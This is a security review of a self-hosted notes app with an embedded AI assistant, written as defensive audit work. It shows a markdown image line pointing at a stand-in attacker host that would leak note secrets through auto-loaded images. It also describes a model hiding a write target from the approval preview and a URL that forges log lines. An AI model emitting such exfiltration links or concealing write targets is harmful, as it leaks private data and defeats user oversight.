# Security review — 2026-10-23

Review of commit `5ce279af` for pkm-3y4b, covering routes added
since the 2026-07-14 review and the embedded assistant boundaries.
The threat model is defined in [SECURITY.md](SECURITY.md).

Severity is assessed within the single-user, Tailscale-only threat model.
No fixes were made. Exploit prerequisites are separate from reproduced
behavior; no real prompt-injection attack against a provider was attempted.

### High: assistant output provides an unapproved outbound data channel

Assistant replies render through `tokenizeBlock` and `InlineSegments` in
[AssistantPanel.tsx](../web/src/assistant/AssistantPanel.tsx).
[AssetImage](../web/src/components/AssetImage.tsx) renders external image
URLs directly. A model that has read sensitive notes can emit
`![citation](https://attacker.invalid/collect?note=SECRET)` and the browser
requests that URL without a click or write confirmation. Disabling the
harness's web tools does not block this channel.

An attacker needs to influence text the assistant reads, successfully
inject the model, and cause it to include sensitive data in an image URL.
The generated image must be near the viewport because loading is lazy.
The outbound channel was reproduced in fresh Chromium using the actual
tokenizer and image component, a synthetic secret, and intercepted network
requests. No secret or request was sent to an external host. The model
injection step itself was not tested.

### Medium: batch approval can conceal the target of a write

`_batch_lines` in [policy.py](../server/src/pkm/assistant/policy.py) clips
the whole serialized `params` object. With an update command whose params
contain `text` first (4,000 characters), followed by
`uid: "sensitive-block"`, the UID disappears from the preview. The real
`validate_batch` accepts this payload and `plan_batch` plans writes to that
block. “Show full preview” only expands the already-clipped server string.

This was reproduced with the real validation, planning and preview
functions. A malicious or injected model can conceal a short target after
long content; the user must still approve the incomplete card. This goes
beyond clipping a long individual value: the target is omitted altogether.

### Low: unauthenticated requests can forge access-log lines

[RequestLogMiddleware](../server/src/pkm/server/request_log.py) passes the
decoded URL path to [request_line](../server/src/pkm/server/logfmt.py),
which interpolates it without escaping control characters. An anonymous
request to `/api/local/probe%0aFORGED%20LOG%20ENTRY%1b%5b31m` returned 401
but logged a literal newline and ANSI escape. A reachable client can forge
apparent log entries or alter terminal presentation without logging in.
This affects log integrity; no authentication bypass was demonstrated.

### Low: diagnostics accepts and logs an unbounded body

`ClientDiagnosticsRequest` and `client_diagnostics` in
[routes_sync.py](../server/src/pkm/server/routes_sync.py) have no body,
field-length or logging-size bound. An authenticated request containing a
2 MiB report string returned 200 and emitted the complete payload. Repeated
large reports can consume memory, log storage and logging time. Log rotation
is time-based, so it does not bound a day's volume. Resource exhaustion was
not attempted.

The diagnostics JSON encoding did escape newlines, carriage returns and
ANSI controls in the probe; its payload did not forge log lines. The
access-log finding is a separate path.

### Boundary observations

- **Local files:** no traversal, decoding, symlink, iCloud-stub containment,
  disposition or error-page escaping bypass was found. Checks precede file
  opening, so a concurrent filesystem writer could race a path replacement;
  that prerequisite is outside the documented private-directory threat
  model. Hidden files remain directly readable by an authenticated client;
  hiding them from the picker is not access control.
- **GoodLinks:** the sanitizer and iframe block script execution and omit
  same-origin permission. The gateway sends its bearer token to the locally
  configured destination, defaults to loopback, and does not follow
  redirects. Request URLs remain query/JSON data, not gateway destinations.
  `save=true` delegates URL fetching to GoodLinks; the external app's fetch
  restrictions were not tested.
- **GoodLinks URL parsing:** `sanitize_article` preserves
  `<img src="https:/api/export.zip">` despite its stated relative-URL ban.
  Chromium resolves it to the app host. The isolated fixture sent no
  `SameSite=Lax` cookie and still blocked scripts, so no authenticated
  disclosure or XSS was demonstrated. Absolute app-origin URLs are already
  permitted; this is a mismatch with the documented invariant, not a new
  demonstrated capability.
- **Image descriptions:** the complete stored image is base64-encoded,
  including any EXIF/GPS or appended metadata, and sent with a fixed prompt,
  MIME type and configured model to OpenAI's fixed HTTPS endpoint. No note
  text, filename or filesystem path is included. Byte preservation was
  verified with a synthetic marker and a mocked transport. Processing is
  enabled at startup when a key exists and `image_descriptions` is true
  (the default); the key file takes precedence over the environment. Uploads
  enqueue automatically; historical assets require authenticated
  `/api/assets/scan`. Disabling requires a configuration change and restart.
  The eligibility and size policy lives in `describe/core.py`.
- **Assistant permissions:** unknown tool names are denied; write tools
  await confirmation; built-ins and filesystem settings are disabled.
  Subprocess credential files have mode `0600`, but deleting them does not
  revoke their ordinary session tokens, as already documented. A real
  provider/harness session was not exercised.

### Verification and limits

A temporary-database route-table probe exercised every registered private
HTTP method/route combination: all 49 returned 401 anonymously. The
WebSocket rejected the handshake (ASGI close code 4401); login, health and
the fixture SPA/static files remained public. This was a one-off probe,
not a new permanent contract test.

Focused existing suites passed: 75 auth/hostile-request/logging/WebSocket,
226 local-file, 146 GoodLinks/image-description, and 168 assistant/MCP tests.
These were targeted runs without the whole-project coverage gate, not full
backend/frontend verification. Additional probes used temporary data,
mocked provider transports and intercepted browser requests. Production,
real provider calls, dependency advisories and a complete deployment audit
were outside this review. No application code or tests were changed.

